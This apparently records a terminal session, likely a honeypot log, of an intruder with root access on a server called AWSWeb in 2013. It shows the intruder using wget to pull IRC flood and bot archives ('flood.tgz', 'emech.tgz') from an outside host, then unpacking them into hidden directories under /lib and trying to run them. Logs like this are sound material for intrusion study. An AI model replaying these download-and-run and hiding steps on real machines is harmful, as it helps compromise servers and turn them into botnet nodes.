@@ -1,0 +1,234 @@
+[4hAWSWeb:~# w
+[4l 10:20:21 up 56 days, 12:24,  1 users, load averages: 0.09 0.05 0.05
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+root     pts/2    77.210.196.252    10:20    0.09   0.05   0.05 w
+[4hAWSWeb:~# ls-as
+bash: ls-as: command not found
+AWSWeb:~# ls -as
+[4l.         ..        .debtags  .viminfo  .aptitude .profile  .bashrc   
+[4hAWSWeb:~# service sendmail stop
+bash: service: command not found
+AWSWeb:~# cat [1D[1P[1D[1P[1D[1P[1D[1Pcat/pri[1D[1Poc/cpuinfo
+bash: cat/proc/cpuinfo: command not found
+AWSWeb:~# cat /pc[1D[1Proc/cpuinfo
+[4lprocessor	: 0
+vendor_id	: GenuineIntel
+cpu family	: 6
+model		: 23
+model name	: Intel(R) Core(TM)2 Duo CPU     E8200  @ 2.66GHz
+stepping	: 6
+cpu MHz		: 2133.305
+cache size	: 6144 KB
+physical id	: 0
+siblings	: 2
+core id		: 0
+cpu cores	: 2
+apicid		: 0
+initial apicid	: 0
+fpu		: yes
+fpu_exception	: yes
+cpuid level	: 10
+wp		: yes
+flags		: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush dts acpi mmx fxsr sse sse2 ss ht tm pbe syscall nx lm constant_tsc arch_perfmon pebs bts rep_good pni monitor ds_cpl vmx smx est tm2 ssse3 cx16 xtpr sse4_1 lahf_lm
+bogomips	: 4270.03
+clflush size	: 64
+cache_alignment	: 64
+address sizes	: 36 bits physical, 48 bits virtual
+power management:
+
+processor	: 1
+vendor_id	: GenuineIntel
+cpu family	: 6
+model		: 23
+model name	: Intel(R) Core(TM)2 Duo CPU     E8200  @ 2.66GHz
+stepping	: 6
+cpu MHz		: 2133.305
+cache size	: 6144 KB
+physical id	: 0
+siblings	: 2
+core id		: 1
+cpu cores	: 2
+apicid		: 1
+initial apicid	: 1
+fpu		: yes
+fpu_exception	: yes
+cpuid level	: 10
+wp		: yes
+flags		: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush dts acpi mmx fxsr sse sse2 ss ht tm pbe syscall nx lm constant_tsc arch_perfmon pebs bts rep_good pni monitor ds_cpl vmx smx est tm2 ssse3 cx16 xtpr sse4_1 lahf_lm
+bogomips	: 4266.61
+clflush size	: 64
+cache_alignment	: 64
+address sizes	: 36 bits physical, 48 bits virtual
+power management:
+
+[4hAWSWeb:~# cd /usr
+[4l[4hAWSWeb:/usr# ls -as
+[4l.       ..      bin     src     include X11R6   sbin    local   lib     share   
+games   
+[4hAWSWeb:/usr# cd /local
+[4lbash: cd: /local: No such file or directory
+[4hAWSWeb:/usr# cd /lib
+[4l[4hAWSWeb:/lib# ls -as
+[4l.                                    ..                                   
+libnss_nisplus-2.7.so                libpthread-2.7.so                    
+libmemusage.so                       libacl.so.1                          
+libproc-3.2.7.so                     libss.so.2.0                         
+libblkid.so.1.0                      modules                              
+libuuid.so.1                         libcidn.so.1                         
+libslang.so.2                        libnss_hesiod-2.7.so                 
+libext2fs.so.2                       libpam.so.0.81.12                    
+libncursesw.so.5.7                   libext2fs.so.2.4                     
+libsepol.so.1                        libwrap.so.0.7.6                     
+libkeyutils.so.1                     libselinux.so.1                      
+libm.so.6                            libuuid.so.1.2                       
+klibc--IOwh0VR87LX1LY95rmnFLc1vuY.so libc-2.7.so                          
+ld-2.7.so                            libacl.so.1.1.0                      
+libanl.so.1                          libnss_files-2.7.so                  
+libpthread.so.0                      libnsl.so.1                          
+libpcprofile.so                      libnss_dns-2.7.so                    
+libbz2.so.1.0.4                      libcidn-2.7.so                       
+libtic.so.5.7                        security                             
+libgcc_s.so.1                        libncursesw.so.5                     
+libcom_err.so.2.1                    libcrypt.so.1                        
+libanl-2.7.so                        udev                                 
+libbz2.so.1                          i686                                 
+libusb-0.1.so.4                      libthread_db-1.0.so                  
+libdl.so.2                           lsb                                  
+librt-2.7.so                         libSegFault.so                       
+libpam.so.0                          libpopt.so.0.0.0                     
+libncurses.so.5                      libthread_db.so.1                    
+libusb-0.1.so.4.4.4                  ld-linux.so.2                        
+libblkid.so.1                        libBrokenLocale.so.1                 
+libncurses.so.5.7                    libpam_misc.so.0.81.3                
+libattr.so.1.1.0                     libnss_nis-2.7.so                    
+libpamc.so.0                         libcom_err.so.2                      
+libreadline.so.5.2                   firmware                             
+libticw.so.5                         libresolv-2.7.so                     
+libvolume_id.so.0                    libnss_dns.so.2                      
+libnss_compat-2.7.so                 librt.so.1                           
+libutil-2.7.so                       libnss_compat.so.2                   
+i486-linux-gnu                       libnsl-2.7.so                        
+libutil.so.1                         libe2p.so.2.3                        
+libbz2.so.1.0                        libss.so.2                           
+libhistory.so.5                      libwrap.so.0                         
+libdl-2.7.so                         libpam_misc.so.0                     
+libattr.so.1                         libtic.so.5                          
+libBrokenLocale-2.7.so               libkeyutils-1.2.so                   
+libreadline.so.5                     libvolume_id.so.0.85.0               
+libc.so.6                            libcrypt-2.7.so                      
+libticw.so.5.7                       libpamc.so.0.81.0                    
+libnss_nisplus.so.2                  libm-2.7.so                          
+init                                 libdevmapper.so.1.02.1               
+libhistory.so.5.2                    libresolv.so.2                       
+libslang.so.2.1.3                    libnss_files.so.2                    
+libnss_hesiod.so.2                   libnss_nis.so.2                      
+terminfo                             libe2p.so.2                          
+libpopt.so.0                         
+[4hAWSWeb:/lib# wget rapk1d.webs.com/flood.tgz
+[4l--2013-03-22 10:21:25--  http://rapk1d.webs.com/flood.tgz
+Connecting to rapk1d.webs.com:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 374651 (365K) [application/octet-stream]
+Saving to: `flood.tgz
+
+ 1% [>                                      ] 3,888        31K/s  eta 11s100%[======================================>] 374,651      31K/s
+
+2013-03-22 10:21:26 (31 KB/s) - `flood.tgz' saved [374651/374651]
+[4hAWSWeb:/lib# tar xzvf flood.tgz
+[4l.icons
+.icons/cyc.levels
+.icons/r
+.icons/r/rnicks.e
+.icons/r/rsignoff.e
+.icons/r/rsay.e
+.icons/r/raway.e
+.icons/r/rinsult.e
+.icons/r/rversions.e
+.icons/r/rpickup.e
+.icons/r/rtsay.e
+.icons/r/rkicks.e
+.icons/run
+.icons/cyc.pid
+.icons/bin
+.icons/cyc.help
+.icons/go
+.icons/mech.dir
+.icons/cyc.acc
+.icons/stealth
+.icons/autorun
+.icons/m.help
+.icons/cyc.set
+.icons/pico
+.icons/cron.d
+.icons/update
+.icons/xhide
+.icons/randfiles
+.icons/randfiles/randsignoff.e
+.icons/randfiles/randkicks.e
+.icons/randfiles/randversions.e
+.icons/randfiles/randinsult.e
+.icons/randfiles/randsay.e
+.icons/randfiles/randaway.e
+.icons/randfiles/randpickup.e
+.icons/randfiles/randnicks.e
+[4hAWSWeb:/lib# rm -rf dl[1D[1P[1D[1Pflood.tgz
+[4l[4hAWSWeb:/lib# cd .icons
+[4l[4hAWSWeb:/lib/.icons# chmod +x *
+[4l[4hAWSWeb:/lib/.icons# ./autorun
+[4l[4hAWSWeb:/lib/.icons# ./go
+[4lerror while loading shared libraries: libgnome.so.32: cannot open shared object file: No such file or directory
+[4hAWSWeb:/lib/.icons# ./fo
+bash: ./fo: command not found
+AWSWeb:/lib/.icons# [K./fo[1D[1P[1D[1Pgo
+[4lerror while loading shared libraries: libgnome.so.32: cannot open shared object file: No such file or directory
+[4hAWSWeb:/lib/.icons# cd /lib
+[4l[4hAWSWeb:/lib# rm -rf .icons
+[4l[4hAWSWeb:/lib# wgeet [1D[1P[1D[1P[1D[1Pt rapk1d.webs.com/emech.tgz
+[4l--2013-03-22 10:22:53--  http://rapk1d.webs.com/emech.tgz
+Connecting to rapk1d.webs.com:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 151427 (147K) [application/octet-stream]
+Saving to: `emech.tgz
+
+ 2% [=>                                     ] 3,888        33K/s  eta 4s100%[======================================>] 151,427      33K/s
+
+2013-03-22 10:22:53 (33 KB/s) - `emech.tgz' saved [151427/151427]
+[4hAWSWeb:/lib# tar xzvf emechtgz[1D[1P[1D[1P[1D[1P.tgz
+[4l.system
+.system/pp3-login
+.system/autorun
+.system/m.ses
+.system/y2kupdate
+.system/mech3
+.system/m.help
+.system/m.lev
+.system/LinkEvents
+.system/cron.d
+.system/m.pid
+.system/mech1
+.system/bash
+.system/m.dir
+.system/r
+.system/r/rkicks.e
+.system/r/rtsay.e
+.system/r/rsignoff.e
+.system/r/rversions.e
+.system/r/rinsult.e
+.system/r/rsay.e
+.system/r/rpickup.e
+.system/r/raway.e
+.system/r/rnicks.e
+.system/start
+.system/mech2
+.system/m.set
+[4hAWSWeb:/lib# cd .system[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Prm -rf emech.tgz
+[4l[4hAWSWeb:/lib# cd .system
+[4l[4hAWSWeb:/lib/.system# chmod +X *
+[4l[4hAWSWeb:/lib/.system# ./start
+[4l=====>Created by PuFoS<=====
+++++++ *Asta e o arhiva privata*  ++++++++
+Exemplu : ./start canal 
+P.S : FARA DIEZ!
+[4hAWSWeb:/lib/.system# cd /lib
+[4l[4hAWSWeb:/lib# rm -rf .system
+[4l[4hAWSWeb:/lib# 
